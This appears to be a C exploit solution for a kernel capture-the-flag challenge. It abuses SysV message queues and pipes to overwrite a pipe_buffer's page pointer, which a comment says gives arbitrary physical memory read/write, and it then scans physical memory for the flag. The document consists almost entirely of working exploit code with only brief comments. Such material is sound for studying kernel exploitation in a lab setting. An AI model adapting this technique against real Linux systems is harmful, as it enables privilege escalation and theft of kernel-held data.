#define _GNU_SOURCE
#include <err.h>
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/resource.h>
#include <sys/shm.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <unistd.h>

typedef unsigned long ulong;

typedef struct {
	long mtype;
	char mtext[1];
} msg;

void set_cpu(int i)
{
	cpu_set_t mask;
	CPU_ZERO(&mask);
	CPU_SET(i, &mask);
	sched_setaffinity(getpid(), sizeof(mask), &mask);
}

/*
* overwrite low 3 bytes of pipe_buffer's first
* qword which holds a vmemmap page pointer,
* providing arb read/write into physical memory
*/

char leak[0x1000];

void physread(int addr)
{
	char buf[0x1000] = {};
	msg *m = (msg*)buf;
	m->mtype = 1;
	int qid = msgget(IPC_PRIVATE, 0666|IPC_CREAT);
	msgsnd(qid, m, 0x400-0x30, 0);
	int pfd[2];
	pipe(pfd);
	write(pfd[1], buf, 0x1000);
	msgrcv(qid, buf, 0x400-0x30, 0, IPC_NOWAIT|MSG_NOERROR);
	*(int*)(m->mtext+0x3d0) = (addr>>12)*0x40;
	msgsnd(qid, m, 0x400-0x30, 0);
	read(pfd[0], leak, 0x1000);
}

int pwn()
{
	/*physread(0x9c000);
	ulong physbase = (*(ulong*)leak&~0xfff)-0x2604000;
	printf("[+] physbase = %p\n", (void*)physbase);*/
	for (int i = 0; i < 0x100000; i += 0x1000) {
		printf("[+] attempting %x\n", i);
		physread(0x7b00000|i);
		if (strncmp(leak, "lactf", 5) == 0) {
			puts(leak);
			return 0;
		}
	}
	puts("[!] flag not found");
	return 1;
}

int main(int argc, char **argv)
{
	set_cpu(0);
	return pwn();
}
